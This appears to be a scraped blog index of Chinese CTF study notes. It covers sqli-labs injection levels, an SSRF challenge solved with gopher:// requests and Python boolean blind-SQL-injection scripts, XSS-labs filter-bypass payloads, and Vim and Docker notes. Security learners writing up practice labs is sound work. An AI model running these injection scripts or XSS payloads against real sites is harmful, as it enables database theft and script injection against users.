查询id为999的用户： level39id无闭合，数字型，直接注入即可，也可像上题一样堆叠注入 level40单引号+括号闭合， 源代码里混入了level24的二次注入？ level41数字型，但是可以堆叠注入 level42 点开忘记密码： 点开新用户： emmm，结合源代码，堆叠注入没跑了： 12$sql = &quot;SELECT * FROM users WHERE username='$username' and password='$password'&quot;;if (@mysqli_multi_query($con1, $sql)) 注意username被转义，可以利用password 12$username = mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);$password = $_POST[&quot;login_password&quot;]; 登陆成功 level43同上题，只是闭合方式换成了单引号括号： 12$sql = &quot;SELECT * FROM users WHERE username=('$username') and password=('$password')&quot;;if (@mysqli_multi_query($con1, $sql)) level44同level42 level45同43 level46一进来这样一个页面，传入sort参数发现数据的顺序改变，推测是传入参数拼接在了order by后面，那就不能联合注入了，看了眼源代码不是用multi_query()，那也没办法堆叠注入了， 想了想还是用报错注入，updatexml() level47比起上一题多了个单引号闭合： level48没有报错信息，判断为数字型，注入点在order by 后，延时注入： level49引号闭合，但是无报错信息，延时注入 level50可报错注入也可堆叠注入： 12345678910$sql=&quot;SELECT * FROM users ORDER BY $id&quot;;/* execute multi query */if (mysqli_multi_query($con1, $sql)) ...... else{ echo '&lt;font color= &quot;#FFFF00&quot;&gt;'; print_r(mysqli_error($con1)); echo &quot;&lt;/font&gt;&quot;; } level51比起上一题多了单引号闭合： 12345678910$sql=&quot;SELECT * FROM users ORDER BY '$id'&quot;;/* execute multi query */if (mysqli_multi_query($con1, $sql)) ...... else{ echo '&lt;font color= &quot;#FFFF00&quot;&gt;'; print_r(mysqli_error($con1)); echo &quot;&lt;/font&gt;&quot;; } level52没有报错，只能堆叠或者延时： 123$sql=&quot;SELECT * FROM users ORDER BY $id&quot;;/* execute multi query */if (mysqli_multi_query($con1, $sql)) level53依旧没有报错，比起上一题多了单引号闭合： 123$sql=&quot;SELECT * FROM users ORDER BY '$id'&quot;;/* execute multi query */if (mysqli_multi_query($con1, $sql)) level54被限定了次数，十次以内要获得secret_key 爆表名： 字段名： 那么我们目标的应该就是secret_P551字段中的东西了，爆数据： level55有14次机会 括号闭合整数： 12$sql=&quot;SELECT * FROM security.users WHERE id=($id) LIMIT 0,1&quot;;$result=mysql_query($sql); level56单引号+括号闭合： level57双引号闭合 level58使用单引号闭合报错注入 level59整数闭合，报错注入： level60双引号+括号报错注入： level61单引号+双括号闭合： level62单引号+括号闭合，无报错结果，可布尔可时间盲注 level63单引号，无报错信息，布尔盲注or时间盲注： level64整数+双括号闭合，布尔or时间盲注 level65双引号+括号闭合，布尔or时间盲注","link":"/2023/02/09/SQLI/"},{"title":"Vim学习","text":"Vim使用笔记这是一个你看不到我吧~测试 vim中有普通模式，输入模式，可视模式以及命令模式4种模式 普通模式普通模式主要是用于对一个文件进行浏览，复制粘贴还有删除 进入输入模式：1i （即insert） 进入命令模式：1: 移动光标：123456789101112131415可以使用↑↓←→方向键，最常用的是hjkl四个键h：左j：下k：上l：右先按数字n再按j(k)对应向下(上)移动n行先按数字n再按h(l)对应向左(右)移动n列w (即word):跳转到下一个单词的开头b (即begin):跳转到前一个单词的开头gg ：回到文档最上方G ：回到文档最下方f (即find)：移动到距离最近的字母处，例fr即移动到距离最近的r处 翻页：12ctrl+u (即up)向上翻页ctrl+d (即down)向下翻页 复制粘贴：1234567891011y (即yank，因为c已经用在了change上了23333)：复制p (即paste)：粘贴y后相关参数说明：yaw (即all word)，复制光标所在一整个单词，包含前后空格yiw (in word)，复制整个单词，不包括前后空格ynj (n是数字)：复制包括该行在内向下4行内容ynk (n是数字)：复制包括该行在内向上4行内容ynh和ynl操作同理yfr (r可以是别的字母)：复制当前字符到最近的字母r之间的所有内容 删除：12345d (即delete)dd (删除本行)dnj (删除包括本行在内以及下面两行)dnh,dnk,dnl同理dfr (删除从光标处到距离最近一个字符r之间的所有内容) 改变：1234c (即change)caw :改变当前单词并进入输入模式cc :删除当前一行并进入输入模式cnj :删除包括本行在内向下4行内容并进入输入模式 命令模式退出：12q!（强制退出）wq（保存退出） 输入模式普通模式下，按 1234a (即append)：在当前光标之后输入i :在当前光标之前输入I :在当前行的最前面开始输入A :在当前行的末尾开始输入 可视模式普通模式下按v(即visual)进入可视模式，会选中光标移动过的内容","link":"/2024/01/07/Vim%E5%AD%A6%E4%B9%A0/"},{"title":"SSRF","text":"SSRF2023ROIS冬令营internal这是什么，两个超链接，点一下（ ​ SQLI页面中的内容： 1234567891011121314151617&lt;?phprequire_once('config.php');if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1') { highlight_file(__FILE__); die('Try to access it from internal!');}echo &quot;Welcome!\\n&quot;;$id = $_POST['id'];if (preg_match(&quot;/union| /i&quot;,$id)) die('You bad bad &gt;_&lt;');$con = mysqli_connect(DB_HOST, DB_USER, DB_PASS, DB_DATABASE);$sql = &quot;SELECT * FROM messages WHERE id=$id&quot;; // SQLI &gt;_&lt;$res = mysqli_query($con, $sql);$message = mysqli_fetch_array($res)['message'];echo $message;#回显Try to access it from internal! if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1')用户访问的IP必须是本地IP才能进行下面的数据库操作等步骤，也就是说只有通过网页服务器内网访问。如果我们能够通过这个服务器中的另外一个不限制于内网访问的页面，把它当做跳板间接对这个仅内网访问的页面进行操作，就能进行传参等操作。也就是实现SSRF。先看另外一个页面： 123456789&lt;?phphighlight_file(__FILE__);// Hint: Do you know gopher?$url = $_POST['url'];if (preg_match(&quot;/file:|ftp:|http:|scp:|dict:/i&quot;,$url)) die('You bad bad &gt;_&lt;');$ch = curl_init($url);$res = curl_exec($ch);echo $res; curl_init()函数初始化一个curl绘会话，值传给$ch，curl_exec()函数执行一个curl会话，值传给$res。最后将结果打印出来。既然可以执行curl，那么不就意味着可以通过这个页面对SQLI页面进行传参等操作了吗。给出了提示：&quot;Do you know gopher?&quot;。emmm。。。并不知道。那就学呗。找到了一篇讲的比较详细的文章学习了一下。 gopher是啥？它是一种协议，支持发出GET、POST请求：可以先截获get请求包和post请求包，再构成符合gopher协议的请求。 gopher协议的格式： 1gopher://&lt;host&gt;:&lt;port&gt;/_后接TCP数据流 需要注意的是，TCP数据流必须是经过url编码的，并且回车和换行必须是%0D%0A，使用脚本或工具编码后回车换行会变成%0A，因此要多一步replace的步骤。在HTTP包的最后要加%0D%0A，代表消息结束（具体可研究HTTP包结束）。以下是通过gopher协议传参的一次示例： GET请求： 准备好一个监听机和一个用户机： nc -lp 1234监听1234端口，使用curl发送http请求curl gopher://172.17.0.1:1234/abcd，监听机收到消息为”bcd”；发送请求curl gopher://172.17.0.1:1234/aabcdnc监听到abcd。因此紧跟在&quot;&lt;PORT&gt;/&quot;字符后面的一个字符会被忽略，可换为任意一个字符。 这是一段网页源码，作用是将GET传入的name的值打印出来： 1234&lt;?php echo &quot;Hello &quot;.$_GET[&quot;name&quot;].&quot;\\n&quot;?&gt;#保存为ssrf.php 这是一个GET请求包 123GET /ssrf.php?name=Potatowo HTTP/1.1Host: 172.17.0.1#回车 经Python脚本编写，生成对应的请求包 1234567891011import urllib.parsedata = \\&quot;&quot;&quot;GET /ssrf.php?name=Margin HTTP/1.1Host: 172.17.0.1#该行要有回车，HTTP数据包结尾&quot;&quot;&quot;result = urllib.parse.quote(data)result = result.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;)#此处将&quot;%0A&quot;替换成&quot;%0D%0A&quot;print(result)#output#GET%20/ssrf.php%3Fname%3DMargin%20HTTP/1.1%0D%0AHost%3A%20172.17.0.1%0D%0A 改为构成符合gopher协议的请求后通过curl发出请求： 12curl gopher://172.17.0.1:8080/_GET%20/ssrf.php%3Fname%3DMargin%20HTTP/1.1%0D%0AHost%3A%20172.17.0.1%0D%0A#注意&quot;8080/&quot;后面紧跟着一个&quot;_&quot;字符。 POST请求： 这是一段网页源码，功能不做过多赘述： 1234&lt;?php echo &quot;Hello &quot;.$_POST[&quot;name&quot;].&quot;\\n&quot;?&gt;#保存为ssrf.php 这是一个POST请求包： 1234567POST /ssrf/base/post.php HTTP/1.1host:172.17.0.1Content-Type:application/x-www-form-urlencodedContent-Length:11name=Potatowo#回车 改为构成符合gopher协议的请求后通过curl发出请求： 12curl gopher://172.17.0.1:8080/_POST%20/ssrf/base/post.php%20HTTP/1.1%0D%0Ahost%3A172.17.0.1%0D%0AContent-Type%3Aapplication/x-www-form-urlencoded%0D%0AContent-Length%3A11%0D%0Aname%3DPotatowo%0D%0A%0D%0A#注意&quot;8080/&quot;后面紧跟着一个&quot;_&quot;字符。 现在回到本题； 既然用得到请求包，那就先bp抓包，对SQLI页面传参，那就抓SQLI页面的包： 1234567891011121314151617181920212223242526import urllib.parsedata = \\&quot;&quot;&quot;POST /sqli.php HTTP/1.1Host: 127.0.0.1#使用脚本时删掉该注释，此处要把原包ip改为改为127.0.0.1Content-Length: 4Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeid=1&quot;&quot;&quot;result = urllib.parse.quote(data)result = result.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;)result = result = urllib.parse.quote(result)#要注意！！如果是希望在浏览器里传参，则要编码两次！！浏览器会自动解码一次，后端解码一次；但是像下面#要讲的用python的requests库直接传参就只需要编码一次因为不需要经过浏览器解码print(result)#output#POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Length%253A%25204%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%2529%2520AppleWebKit/537.36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome/109.0.0.0%2520Safari/537.36%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252Cimage/apng%252C%252A/%252A%253Bq%253D0.8%252Capplication/signed-exchange%253Bv%253Db3%253Bq%253D0.9%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%250D%250AConnection%253A%2520close%250D%250A%250D%250Aid%253D1%250D%250A%250D%250A 改为符合gopher协议的形式，注意由于curl_exec()的执行是在服务端里进行的，所以gopher://协议的地址应改为127.0.0.1:80，80端口是跑web服务的端口。 将脚本中的content进行修改，content = &quot;id=1 and 1=1&quot;，传入，结果： emmm。。这时候突然想起来SQLI页面是不是有过滤来着赶紧打开看了眼 12if (preg_match(&quot;/union| /i&quot;,$id)) die('You bad bad &gt;_&lt;'); 看来是ban掉了union和空格。难怪，那改成content = &quot;id=1/**/and/**/1=1&quot;绕过空格过滤，回显&quot;Welcome! meow meow meow~1&quot;，改成content = &quot;id=1/**/and/**/1=2&quot;，回显&quot;Welcome! 1&quot;。sql语句判断为真会返回&quot;Welcome! meow meow meow~1&quot;，为假不含meow meow meow~，同时union被ban了，尝试用加号拼接&quot;uni&quot;,&quot;on&quot;，结果加号url编码与空格相同（悲，现在意图也比较明显了，布尔盲注。 完善脚本： 123456789101112131415161718192021222324252627282930313233import urllib.parseimport requestsurl = &quot;http://192.168.150.1:43083/curl.php&quot;for i in range(0,126): content = &quot;id=1 and (length(database())={})#&quot;.format(i) content = content.replace(&quot; &quot;, &quot;/**/&quot;)#SQL页面存在空格过滤用/**/绕过 content_length = len(content) data = \\#切记切记下面字符串每行左边要贴边，不然tab会被编码f&quot;&quot;&quot;POST /sqli.php HTTP/1.1Host: 127.0.0.1Content-Length: {content_length}Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close{content}&quot;&quot;&quot; result = urllib.parse.quote(data) result = result.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;) payload = &quot;gopher://127.0.0.1:80/_&quot;+result#用python直接传参只需要编码一次 r = requests.post(url,data={&quot;url&quot;:payload}).text #print(r) if &quot;meow&quot; in r:#如果sql返回为真，页面会显示&quot;meow meow~&quot; print(i) break#output#3 输出3，得出数据库长度为3。 123456789101112131415161718192021222324252627282930313233343536373839import urllib.parseimport requestsurl = &quot;http://192.168.150.1:43083/curl.php&quot;database = &quot;&quot;for i in range(1,100): for j in range(32,126): content = &quot;id=1 and (ascii(substr(database(),{},1))={})#&quot;.format(i,j)#判断数据库名第i个字符的ascii码是否为j，是的话为真会返回&quot;meow&quot; content = content.replace(&quot; &quot;, &quot;/**/&quot;)#SQL页面存在空格过滤用/**/绕过 content_length = len(content) data = \\f&quot;&quot;&quot;POST /sqli.php HTTP/1.1Host: 127.0.0.1Content-Length: {content_length}Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close{content}&quot;&quot;&quot; result = urllib.parse.quote(data) result = result.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;) payload = &quot;gopher://127.0.0.1:80/_&quot;+result r = requests.post(url,data={&quot;url&quot;:payload}).text #print(r) if &quot;meow&quot; in r: database += chr(j) print(database) break#output#r#ru#rua#数据库名为rua 同样，爆表名，因为可能存在多个表，所以使用group_concat() 123456789101112131415161718for i in range(1,100): for j in range(32,126): content = &quot;id=1 and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),{},1))={})#&quot;.format(i,j) ...........#output#f#fl#fla#flag#flag,#flag,m#flag,me#flag,mes#flag,mess#flag,messa#flag,messag#flag,message#flag,messages 盲猜flag在flag表里，爆字段名： 123456789for i in range(1,100): for j in range(32,126): content = &quot;id=1 and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = 'flag'),{},1))={})#&quot;.format(i,j)#爆字段名 ...........#output#f#fl#fla#flag 已知信息： 数据库rua、表flag、字段flag，爆flag内容： 123for i in range(1,100): for j in range(32,126): content = &quot;id=1 and (ascii(substr((select group_concat(flag) from flag),{},1))={})#&quot;.format(i,j)#爆flag表内容 拿到flag，本题还可以用二分法优化算法，附上L1ao学长的脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051import urllib.parseimport requestsdef fuck(): url = &quot;http://192.168.150.1:43083/curl.php&quot; result=&quot;&quot; for i in range(1,1290): head=32 tail=127 while head&lt;tail: mid=(head+tail)&gt;&gt;1 sqli = &quot;1/**/and/**/if(ascii(substr((seleCt(group_concat(schema_name))from(information_schema.schemata)),{},1))&gt;{},1,0)%23&quot;.format(i,mid) sqli = &quot;1/**/and/**/if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='rua'),{},1))&gt;{},1,0)%23&quot;.format(i,mid) sqli = &quot;1/**/and/**/if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)='flag'),{},1))&gt;{},1,0)%23&quot;.format(i,mid) sqli = &quot;1/**/and/**/if(ascii(substr((seLect(flag)from(rua.flag)),{},1))&gt;{},1,0)%23&quot;.format(i,mid) id = urllib.parse.quote(sqli) id_length = len(id)+3 payload = f&quot;&quot;&quot;POST /sqli.php HTTP/1.1Host: 127.0.0.1Content-Length: {id_length}Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeid={id}&quot;&quot;&quot; # print(payload) tmp = urllib.parse.quote(payload) new = tmp.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;) res = 'gopher://127.0.0.1:80/_' + new dataa = { &quot;url&quot;:res } r = requests.post(url=url,data=dataa) # print(r.text) if &quot;meow meow meow&quot; in r.text: head=mid+1 else: tail=mid if head !=32: result+=chr(head) else: break print(result)fuck()","link":"/2023/02/09/SSRF/"},{"title":"WACONCTF2023","text":"WACONCTF2023","link":"/2023/09/15/WACONCTF2023/"},{"title":"XSS","text":"Xss_Labs涉及到XSS查看源代码的操作均使用ViewSource，不要用开发者工具的Elements查看！不会显示HTML实体的，浏览器会自动解码！ level2传&lt;script&gt;alert(1)&lt;/script&gt;如下： 看一眼源代码，发现value属性中的字符没有变成HTML实体，而&lt;h2&gt;标签内的变了，说明在表单内的字符没有进行过滤，GET传入服务器时无过滤，但是服务器传回到浏览器发生转义，emmm，那就直接闭合input标签就好了 payload: 1&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; level3用个&lt;script&gt;alert(1)&lt;/script&gt;探探路，表单内的和h2标签的都被转义了， 那我们就看看有哪些预定义字符是会被php转义成实体的(文章参考这篇) 解码结果 描述 实体名称 空格 &amp;nbsp; &lt; 小于号 &amp;lt &gt; 大于号 &amp;gt &amp; 和 &amp;amp “ 双引号 &amp;quot 注意单引号虽然存在实体&amp;apos但是不被转义，HTML5中预留但是也不推荐使用 先闭合value，再引入鼠标事件的属性(onclick,onfocus,onmouseover,onmouseout等等) 构造payload： 1234' onclick=javascript:alert(1) ' //点击input标签时' onfocus=javascript:alert(1) ' //聚焦input标签时' onmouseover=javascript:alert(1) ' //进入input标签时' onmouseout=javascript:alert(1) ' //移出input标签时 level4依旧传入&lt;script&gt;alert(1)&lt;/script&gt;，打开网页源码发现value没被转义但是&lt;&gt;字符被过滤，但是h2标签内被转义 123456$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;&lt;form action=level4.php method=GET&gt;&lt;input name=keyword value=&quot;'.$str3.'&quot;&gt; 试下和上一题同样的操作，但是双引号闭合： payload: 1&quot; onmouseout=javascript:alert(1) &quot; level5依旧&lt;script&gt;alert(1)&lt;/script&gt;开局，script变成scr_ipt，再试试鼠标事件，on变成o_n，试一下大写绕过，结果全被换成小写， 去看下后端代码，script和on被替换，并且strtolower()函数存在，全转成小写 123456$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;&lt;form action=level5.php method=GET&gt;&lt;input name=keyword value=&quot;'.$str3.'&quot;&gt; 尝试js伪协议： 1234&lt;a href=javascript:/0/,alert(%22M%22)&gt;M&lt;/a&gt;&lt;a href=javascript:/00/,alert(%22M%22)&gt;M&lt;/a&gt;&lt;a href=javascript:/000/,alert(%22M%22)&gt;M&lt;/a&gt;&lt;a href=javascript:/M/,alert(%22M%22)&gt;M&lt;/a&gt; payload 1&quot;&gt;&lt;a href='javascript:alert(1)'&gt;m&lt;/a&gt; 点击这个链接： level6前面踩坑过程都一样，直接上后端代码 123456789$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;&lt;form action=level6.php method=GET&gt;&lt;input name=keyword value=&quot;'.$str6.'&quot;&gt; 与上一题不同的是，这题没有小写转换，大写绕过下 payload： 1&quot;&gt;&lt;Script&gt;alert(1)&lt;/Script&gt; level7直接上后端代码： 123456789$str =strtolower( $_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;&lt;form action=level7.php method=GET&gt;&lt;input name=keyword value=&quot;'.$str6.'&quot;&gt; 全转成小写再过滤，很明显双写绕过了 payload: 1&quot;&gt;&lt;scriscriptpt&gt;alert(1)&lt;/scriscriptpt&gt; level8后端代码： 12345678910111213141516171819&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace('&quot;','&amp;quot',$str6);echo '&lt;center&gt;&lt;form action=level8.php method=GET&gt;&lt;input name=keyword value=&quot;'.htmlspecialchars($str).'&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;';?&gt;&lt;?php echo '&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;'.$str7.'&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;';?&gt; 是把传入的字符串进行转小写之后进行一系列过滤操作，最后将字符写入a标签的href属性中，跳转链接 利用js伪协议，传javascript:alert(1)，但是script被过滤，上网搜了下，可以使用unicode编码 level9上代码： 123456789101112131415161718192021222324$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace('&quot;','&amp;quot',$str6);echo '&lt;center&gt;&lt;form action=level9.php method=GET&gt;&lt;input name=keyword value=&quot;'.htmlspecialchars($str).'&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;';?&gt;&lt;?phpif(false===strpos($str7,'http://')){ echo '&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;'; }else{ echo '&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;'.$str7.'&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;';}?&gt; 下面多了个strpos()函数的验证，输入字符串必须包含’http://‘，emmm，可是你也妹说在哪写’http://‘，直接和第八题一样 编码’javascript’： payload: 1&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert('http://') level10话不多说，上代码： 123456789101112$str = $_GET[&quot;keyword&quot;];$str11 = $_GET[&quot;t_sort&quot;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;'.$str33.'&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;';?&gt; emmm，表单隐藏起来了呀，小问题，这不是可以GET传参嘛 传了个&quot; onclick='javascript:alert(1)'，唉呦吼吼，忘记了，表单隐藏了，所以没法点击，想了个办法，但是感觉是非预期解吧。。就是开开发者工具修改网页代码，把type属性删掉，过是过了，但是好蠢www，去网上看了下 1?keyword=nul&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert('xss') 这里input标签内将会出现两个type属性，浏览器通常会判定第一个出现的值作为最终的值 level111234567891011121314$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_SERVER['HTTP_REFERER'];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;'.htmlspecialchars($str00).'&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_ref&quot; value=&quot;'.$str33.'&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;';?&gt; 先看参数t_sort，想通过覆盖type属性的值就要闭合双引号，就会被转义，是行不通的，那就通过t_ref参数，修改ref头来进行xss level12同上，换成了ua level13同上，换成了cookie level14题目出问题了，做不了 level1512345&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;src&quot;];echo '&lt;body&gt;&lt;span class=&quot;ng-include:'.htmlspecialchars($str).'&quot;&gt;&lt;/span&gt;&lt;/body&gt;';?&gt; ng-include:这玩意类似于php的include，文件包含 123456789101112131415161、ng-include 指令用于包含外部的 HTML文件。2、包含的内容将作为指定元素的子节点。3、ng-include 属性的值可以是一个表达式，返回一个文件名。4、默认情况下，包含的文件需要包含在同一个域名下。特别值得注意的几点如下：1.ng-include,如果单纯指定地址，必须要加引号2.ng-include,加载外部html，script标签中的内容不执行3.ng-include,加载外部html中含有style标签样式可以识别 所以可以包含同样存在xss漏洞的level1： payload: 因为不执行script标签内容，所以这里使用伪协议或者&lt;img&gt;标签 1234?src='level1.php?name=&lt;a href='javascript:alert(1)'&gt;xss&lt;/a&gt;'//错误的，自己看着点单双引号?src='level1.php?name=&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;'//正确的?src='level1.php?name=&lt;img src=1 onerror=alert(1)/&gt;'//错误的，不要加'/'?src='level1.php?name=&lt;img src=1 onerror=alert(1)&gt;'//正确的 level17123456$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);$str5=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str4);echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;; 不让用script?那就用&lt;img&gt;，空格过滤？那么多绕过姿势 payload: 123&lt;img%0asrc=x%0aonerror=alert(1)&gt;&lt;img%0csrc=x%0conerror=alert(1)&gt;&lt;img%0dsrc=x%0donerror=alert(1)&gt;","link":"/2023/02/09/XSS/"},{"title":"docker_note","text":"Windows上一定要先安装WSL。 复现CTF赛题环境作为一名CTF萌新，一切的一切的一切先从如何复现环境开始（ 123#给了Dockerfile的情况docker build -t &lt;镜像名&gt; .#注意这里最后有个&quot;.&quot;不能省略docker run -idP &lt;镜像名&gt; 12#给了docker-compose.yml的情况docker-compose up -d 12sudo service docker status#查看docker运行状态sudo service docker start#启动docker 学习记录基本操作12docker run ubuntu:20.04 /bin/echo &quot;hello world&quot;#run 代表运行一个容器，unbuntu:20.04代表镜像(images)，由ubuntu:20.04镜像创建一个新的容器并运行。后面的/bin/echo代表执行该容器/bin/下的echo命令 1234docker run -it ubuntu:20.04 /bin/bash#-i：允许容器内的标准输出进行交互#-t：在新容器内指定一个伪终端或终端#如果不存在该镜像则自动拉取安装一个 12#进入容器之后想退出root@&lt;容器ID&gt;:/# exit 123docker run -d ubuntu:20.04 /bin/echo &quot;hello world&quot;#-d表示在后台运行#上述指令执行完之后并没有回显&quot;hello 